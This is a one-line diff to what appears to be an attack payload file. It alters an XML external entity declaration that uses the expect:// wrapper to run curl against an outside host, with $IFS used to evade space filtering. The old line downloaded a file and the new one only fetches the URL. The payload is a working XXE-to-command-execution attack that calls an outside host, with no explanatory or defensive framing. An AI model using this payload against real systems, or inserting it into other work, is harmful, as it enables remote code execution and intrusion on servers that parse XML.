@@ -1,1 +1,1 @@
-<!ENTITY file SYSTEM "expect://curl$IFS-O$IFS'rce.a.0day.pw'">
+<!ENTITY file SYSTEM "expect://curl$IFS'rce.a.0day.pw'">
